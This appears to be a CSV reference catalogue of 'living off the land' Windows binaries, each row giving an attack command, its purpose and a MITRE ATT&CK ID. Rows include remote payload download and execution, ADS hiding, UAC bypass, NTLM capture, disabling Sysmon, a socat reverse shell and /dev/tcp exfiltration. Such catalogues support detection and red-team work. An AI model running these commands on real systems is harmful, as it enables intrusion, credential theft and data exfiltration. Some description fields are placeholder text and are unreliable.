Category,Name,Description,Created,Command,Command Description,Command Category,Command Usecase,Command Privileges,Command OperatingSystem,Command MitreID
OSBinaries,vbc.exe,Binary file used for compile vbs code,2020-02-27,vbc.exe /target:exe c:\temp\vbs\run.vb,Binary file used by .NET to compile vb code to .exe,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows 10,7",T1127
OSBinaries,vbc.exe,Binary file used for compile vbs code,2020-02-27,vbc -reference:Microsoft.VisualBasic.dll c:\temp\vbs\run.vb,Description of the second command,Compile,A description of the usecase,User,"Windows 10,7",T1127
OSBinaries,Diantz.exe,Binary that package existing files into a cabinet (.cab) file,2020-08-08,diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab,Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Hide data compressed into an Alternate Data Stream.,User,"Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.",T1564.004
OSBinaries,Diantz.exe,Binary that package existing files into a cabinet (.cab) file,2020-08-08,diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab,Download and compress a remote file and store it in a cab file on local machine.,Download,Download and compress into a cab file.,User,"Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019",T1105
OSBinaries,Rpcping.exe,Used to verify rpc connection,2018-05-25,rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.,Credentials,Capture credentials on a non-standard port,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1003
OSBinaries,Rpcping.exe,Used to verify rpc connection,2018-05-25,rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).,Credentials,Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1187
OSBinaries,Wsreset.exe,Used to reset Windows Store settings according to its manifest file,2019-03-18,wsreset.exe,"During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.",UAC bypass,Execute a binary or script as a high-integrity process without a UAC prompt.,User,Windows 10,T1548.002
OSBinaries,Ttdinject.exe,Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe),2020-05-12,"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""","Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",Execute,Spawn process using other binary,Administrator,Windows 10 2004,T1127
OSBinaries,Ttdinject.exe,Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe),2020-05-12,"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""C:/Windows/System32/calc.exe""","Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",Execute,Spawn process using other binary,Administrator,Windows 10 1909,T1127
OSBinaries,Ilasm.exe,used for compile c# code into dll or exe.,2020-03-17,ilasm.exe C:\public\test.txt /exe,Binary file used by .NET to compile C#/intermediate (IL) code to .exe,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows 10,7",T1127
OSBinaries,Ilasm.exe,used for compile c# code into dll or exe.,2020-03-17,ilasm.exe C:\public\test.txt /dll,Binary file used by .NET to compile C#/intermediate (IL) code to dll,Compile,A description of the usecase,User,N/A,T1127
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Download and save 7zip to disk in the current folder.,Download,Download file from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Download and save 7zip to disk in the current folder.,Download,Download file from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt,Download and save a PS1 file to an Alternate Data Stream (ADS).,ADS,Download file from Internet and save it in an NTFS Alternate Data Stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil -encode inputFileName encodedOutputFileName,Command to encode a file using Base64,Encode,Encode files to evade defensive measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1027
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil -decode encodedInputFileName decodedOutputFileName,Command to decode a Base64 encoded file.,Decode,Decode files to evade defensive measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1140
OSBinaries,Certutil.exe,Windows binary used for handling certificates,2018-05-25,certutil --decodehex encoded_hexadecimal_InputFileName,Command to decode a hexadecimal-encoded file decodedOutputFileName,Decode,Decode files to evade defensive measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1140
OSBinaries,Replace.exe,Used to replace file with another file,2018-05-25,replace.exe C:\Source\File.cab C:\Destination /A,Copy file.cab to destination,Copy,Copy files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Replace.exe,Used to replace file with another file,2018-05-25,replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A,Download/Copy bar.exe to outdir,Download,Download file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Mshta.exe,Used by Windows to execute html applications. (.hta),2018-05-25,mshta.exe evilfile.hta,"Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",Execute,Execute code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.005
OSBinaries,Mshta.exe,Used by Windows to execute html applications. (.hta),2018-05-25,"mshta.exe vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))",Executes VBScript supplied as a command line argument.,Execute,Execute code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.005
OSBinaries,Mshta.exe,Used by Windows to execute html applications. (.hta),2018-05-25,"mshta.exe javascript:a=GetObject(""script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct"").Exec();close();",Executes JavaScript supplied as a command line argument.,Execute,Execute code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.005
OSBinaries,Mshta.exe,Used by Windows to execute html applications. (.hta),2018-05-25,"mshta.exe ""C:\ads\file.txt:file.hta""","Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.",ADS,Execute code hidden in alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)",T1218.005
OSBinaries,Bitsadmin.exe,Used for managing background intelligent transfer,2018-05-25,bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.",ADS,"Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.",User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Bitsadmin.exe,Used for managing background intelligent transfer,2018-05-25,bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",Download,Download file from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Bitsadmin.exe,Used for managing background intelligent transfer,2018-05-25,bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Command for copying cmd.exe to another folder,Copy,Copy file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Bitsadmin.exe,Used for managing background intelligent transfer,2018-05-25,bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,"One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",Execute,Execute binary file specified. Can be used as a defensive evasion.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Wscript.exe,Used by Windows to execute scripts,2018-05-25,wscript c:\ads\file.txt:script.vbs,Execute script stored in an alternate data stream,ADS,Execute hidden code to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Wscript.exe,Used by Windows to execute scripts,2018-05-25,"echo GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js",Download and execute script stored in an alternate data stream,ADS,Execute hidden code to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,CertOC.exe,Used for installing certificates,2021-10-07,"certoc.exe -LoadDLL ""C:\test\calc.dll""",Loads the target DLL file,Execute,Execute code within DLL file,User,Windows Server 2022,T1218
OSBinaries,CertOC.exe,Used for installing certificates,2021-10-07,certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,Downloads text formatted files,Download,"Download scripts, webshells etc.",User,Windows Server 2022,T1105
OSBinaries,Ieexec.exe,The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.,2018-05-25,ieexec.exe http://x.x.x.x:8080/bypass.exe,Downloads and executes bypass.exe from the remote server.,Download,Download and run attacker code from remote location,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Ieexec.exe,The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.,2018-05-25,ieexec.exe http://x.x.x.x:8080/bypass.exe,Downloads and executes bypass.exe from the remote server.,Execute,Download and run attacker code from remote location,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Cmd.exe,The command-line interpreter in Windows,2019-06-26,cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,Add content to an Alternate Data Stream (ADS).,ADS,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1059.003
OSBinaries,Cmd.exe,The command-line interpreter in Windows,2019-06-26,cmd.exe - < fakefile.doc:payload.bat,Execute payload.bat stored in an Alternate Data Stream (ADS).,ADS,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1059.003
OSBinaries,Microsoft.Workflow.Compiler.exe,A utility included with .NET that is capable of compiling and executing C# or VB.net code.,2018-10-22,Microsoft.Workflow.Compiler.exe tests.xml results.xml,Compile and execute C# or VB.net code in a XOML file referenced in the test.xml file.,Execute,Compile and run code,User,Windows 10S,T1127
OSBinaries,Microsoft.Workflow.Compiler.exe,A utility included with .NET that is capable of compiling and executing C# or VB.net code.,2018-10-22,Microsoft.Workflow.Compiler.exe tests.txt results.txt,Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.,Execute,Compile and run code,User,Windows 10S,T1127
OSBinaries,Microsoft.Workflow.Compiler.exe,A utility included with .NET that is capable of compiling and executing C# or VB.net code.,2018-10-22,Microsoft.Workflow.Compiler.exe tests.txt results.txt,Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.,AWL Bypass,Compile and run code,User,Windows 10S,T1127
OSBinaries,cmdl32.exe,Microsoft Connection Manager Auto-Download,2021-08-26,cmdl32 /vpn /lan %cd%\config,"Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where ""X"" denotes a random number or letter.",Download,Download file from Internet,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Runscripthelper.exe,,2018-05-25,runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test,Execute the PowerShell script named test.txt,Execute,Bypass constrained language mode and execute Powershell script,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,PrintBrm.exe,Printer Migration Command-Line Tool,2021-06-21,PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip,Create a ZIP file from a folder in a remote drive,Download,Exfiltrate the contents of a remote folder on a UNC share into a zip file,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,PrintBrm.exe,Printer Migration Command-Line Tool,2021-06-21,PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder,Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder,ADS,Decompress and extract a ZIP file stored on an alternate data stream to a new folder,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Makecab.exe,Binary to package existing files into a cabinet (.cab) file,2018-05-25,makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Hide data compressed into an alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Makecab.exe,Binary to package existing files into a cabinet (.cab) file,2018-05-25,makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,ADS,Hide data compressed into an alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Makecab.exe,Binary to package existing files into a cabinet (.cab) file,2018-05-25,makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab,Download and compresses the target file and stores it in the target file.,Download,Download file and compress into a cab file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Forfiles.exe,Selects and executes a command on a file or set of files. This command is useful for batch processing.,2018-05-25,forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Executes calc.exe since there is a match for notepad.exe in the c:\windows\System32 folder.,Execute,Use forfiles to start a new process to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Forfiles.exe,Selects and executes a command on a file or set of files. This command is useful for batch processing.,2018-05-25,"forfiles /p c:\windows\system32 /m notepad.exe /c ""c:\folder\normal.dll:evil.exe""",Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.,ADS,Use forfiles to start a new process from a binary hidden in an alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Desktopimgdownldr.exe,Windows binary used to configure lockscreen/desktop image,2020-06-28,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr",Downloads the file and sets it as the computer's lockscreen,Download,Download arbitrary files from a web server,User,Windows 10,T1105
OSBinaries,Aspnet_Compiler.exe,ASP.NET Compilation Tool,2021-09-26,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,Execute C# code with the Build Provider and proper folder structure in place.,AWL Bypass,Execute proxied payload with Microsoft signed binary to bypass application control solutions,User,Windows 10,T1127
OSBinaries,Control.exe,Binary used to launch controlpanel items in Windows,2018-05-25,control.exe c:\windows\tasks\file.txt:evil.dll,Execute evil.dll which is stored in an Alternate Data Stream (ADS).,ADS,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.002
OSBinaries,Msbuild.exe,Used to compile and execute code,2018-05-25,msbuild.exe pshell.xml,Build and execute a C# project stored in the target XML file.,AWL bypass,Compile and run code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127.001
OSBinaries,Msbuild.exe,Used to compile and execute code,2018-05-25,msbuild.exe project.csproj,Build and execute a C# project stored in the target csproj file.,Execute,Compile and run code,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127.001
OSBinaries,Msbuild.exe,Used to compile and execute code,2018-05-25,msbuild.exe @sample.rsp,Executes Logger statements from rsp file,Execute,Execute DLL,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127.001
OSBinaries,Msbuild.exe,Used to compile and execute code,2018-05-25,"msbuild.exe /logger:TargetLogger,C:\Loggers\TargetLogger.dll;MyParameters,Foo",Executes generated Logger dll file with TargetLogger export,Execute,Execute DLL,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127.001
OSBinaries,Msbuild.exe,Used to compile and execute code,2018-05-25,msbuild.exe project.proj,Execute jscript/vbscript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.,Execute,Execute project file that contains XslTransformation tag parameters,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127.001
OSBinaries,Register-cimprovider.exe,Used to register new wmi providers,2018-05-25,"Register-cimprovider -path ""C:\folder\evil.dll""",Load the target .DLL.,Execute,Execute code within dll file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,fltMC.exe,Filter Manager Control Program used by Windows,2021-09-18,fltMC.exe unload SysmonDrv,Unloads a driver used by security agents,ADS,Defense evasion,Admin,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1562.001
OSBinaries,Tttracer.exe,Used by Windows 1809 and newer to Debug Time Travel,2019-11-05,tttracer.exe C:\windows\system32\calc.exe,Execute calc using tttracer.exe. Requires administrator privileges,Execute,Spawn process using other binary,Administrator,Windows 10 1809 and newer,T1127
OSBinaries,Tttracer.exe,Used by Windows 1809 and newer to Debug Time Travel,2019-11-05,TTTracer.exe -dumpFull -attach pid,Dumps process using tttracer.exe. Requires administrator privileges,Dump,Dump process by PID,Administrator,Windows 10 1809 and newer,T1003
OSBinaries,Ie4uinit.exe,,2018-05-25,ie4uinit.exe -BaseSettings,Executes commands from a specially prepared ie4uinit.inf file.,Execute,Get code execution by copy files to another location,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Sc.exe,Used by Windows to manage services,2018-05-25,"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",Creates a new service and executes the file stored in the ADS.,ADS,Execute binary file hidden inside an alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Sc.exe,Used by Windows to manage services,2018-05-25,"sc config <existing> binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start <existing>",Modifies an existing service and executes the file stored in the ADS.,ADS,Execute binary file hidden inside an alternate data stream,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Bash.exe,File used by Windows subsystem for Linux,2018-05-25,bash.exe -c calc.exe,Executes calc.exe from bash.exe,Execute,"Performs execution of specified file, can be used as a defensive evasion.",User,Windows 10,T1202
OSBinaries,Bash.exe,File used by Windows subsystem for Linux,2018-05-25,"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",Executes a reverseshell,Execute,"Performs execution of specified file, can be used as a defensive evasion.",User,Windows 10,T1202
OSBinaries,Bash.exe,File used by Windows subsystem for Linux,2018-05-25,bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24',Exfiltrate data,Execute,"Performs execution of specified file, can be used as a defensive evasion.",User,Windows 10,T1202
OSBinaries,Bash.exe,File used by Windows subsystem for Linux,2018-05-25,bash.exe -c calc.exe,Executes calc.exe from bash.exe,AWL Bypass,"Performs execution of specified file, can be used to bypass Application Whitelisting.",User,Windows 10,T1202
OSBinaries,Hh.exe,Binary used for processing chm files in Windows,2018-05-25,HH.exe http://some.url/script.ps1,Open the target PowerShell script with HTML Help.,Download,Download files from url,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Hh.exe,Binary used for processing chm files in Windows,2018-05-25,HH.exe c:\windows\system32\calc.exe,Executes calc.exe with HTML Help.,Execute,Execute process with HH.exe,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.001
OSBinaries,SettingSyncHost.exe,Host Process for Setting Synchronization,2021-08-26,SettingSyncHost -LoadAndRunDiagScript anything,Execute file specified in %COMSPEC%,Execute,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,SettingSyncHost.exe,Host Process for Setting Synchronization,2021-08-26,SettingSyncHost -LoadAndRunDiagScriptNoCab anything,Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.,Execute,"Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.",User,"Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Finger.exe,Displays information about a user or users on a specified remote computer that is running the Finger service or daemon,2021-08-30,finger user@example.host.com | more +2 | cmd,"Downloads payload from remote Finger server. This example connects to ""example.host.com"" asking for user ""user""; the result could contain malicious shellcode which is executed by the cmd process.",Download,Download malicious payload,User,"Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022",T1105
OSBinaries,Cmstp.exe,Installs or removes a Connection Manager service profile.,2018-05-25,cmstp.exe /ni /s c:\cmstp\CorpVPN.inf,Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,Execute,Execute code hidden within an inf file. Download and run scriptlets from internet.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.003
OSBinaries,Cmstp.exe,Installs or removes a Connection Manager service profile.,2018-05-25,cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,AwL bypass,Execute code hidden within an inf file. Execute code directly from Internet.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.003
OSBinaries,Mmc.exe,Load snap-ins to locally and remotely manage Windows systems,2018-12-04,mmc.exe -Embedding c:\path\to\test.msc,Launch a 'backgrounded' MMC process and invoke a COM payload,Execute,Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry,User,Windows 10 (and possibly earlier versions),T1218.014
OSBinaries,Mmc.exe,Load snap-ins to locally and remotely manage Windows systems,2018-12-04,mmc.exe gpedit.msc,Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.,UAC Bypass,Modify HKCU\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.,Administrator,Windows 10 (and possibly earlier versions),T1218.014
OSBinaries,Jsc.exe,Binary file used by .NET to compile javascript code to .exe or .dll format,2019-05-31,jsc.exe scriptfile.js,Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSBinaries,Jsc.exe,Binary file used by .NET to compile javascript code to .exe or .dll format,2019-05-31,jsc.exe /t:library Library.js,Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSBinaries,ConfigSecurityPolicy.exe,Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.,2020-09-04,ConfigSecurityPolicy.exe C:\\Windows\\System32\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,"Upload file, credentials or data exfiltration in general",Upload,Upload file,User,Windows 10,T1567
OSBinaries,Stordiag.exe,Storage diagnostic tool,2021-10-21,stordiag.exe,"Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.",Execute,Possible defence evasion purposes.,User,Windows 10,T1218
OSBinaries,Scriptrunner.exe,,2018-05-25,Scriptrunner.exe -appvscript calc.exe,Executes calc.exe,Execute,Execute binary through proxy binary to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Scriptrunner.exe,,2018-05-25,"ScriptRunner.exe -appvscript ""\\fileserver\calc.cmd""",Executes calc.cmd from remote server,Execute,Execute binary through proxy binary from external server to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Odbcconf.exe,Used in Windows for managing ODBC connections,2018-05-25,odbcconf -f file.rsp,Load DLL specified in target .RSP file. See the Playloads folder for an example .RSP file.,Execute,Execute dll file using technique that can evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.008
OSBinaries,Odbcconf.exe,Used in Windows for managing ODBC connections,2018-05-25,odbcconf /a {REGSVR c:\test\test.dll},Execute DllREgisterServer from DLL specified.,Execute,Execute dll file using technique that can evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.008
OSBinaries,Extexport.exe,,2018-05-25,Extexport.exe c:\test foo bar,"Load a DLL located in the c:\test folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll",Execute,Execute dll file,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
